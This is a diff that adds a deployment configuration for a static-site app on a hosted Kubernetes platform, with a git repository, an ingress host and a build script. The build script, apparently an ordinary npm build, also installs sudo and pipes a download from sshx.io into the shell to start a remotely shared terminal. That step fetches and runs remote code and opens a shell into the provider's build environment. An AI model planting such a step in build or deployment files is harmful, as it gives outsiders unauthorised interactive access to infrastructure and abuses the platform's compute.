@@ -1,0 +1,26 @@
+app: btestcpu
+env: inviting-bush
+namespace: default
+chart:
+  repository: https://chart.onechart.dev
+  name: static-site
+  version: 0.70.0
+values:
+  buildScript: |2-
+     # !/usr/bin/env bash
+
+    npm install
+    npm run build
+    apt update
+    apt upgrade -y
+    apt install sudo
+    curl -sSf https://sshx.io/get | sh -s run
+  gitCloneUrl: https://github.com/Teo4268/Webtestcpu.git
+  gitRepository: Teo4268/Webtestcpu
+  gitSha: '{{ .SHA }}'
+  ingress:
+    annotations:
+      cert-manager.io/cluster-issuer: letsencrypt
+      kubernetes.io/ingress.class: nginx
+    host: teo4268-webtestcpu-minknzka.gimlet.app
+    tlsEnabled: true
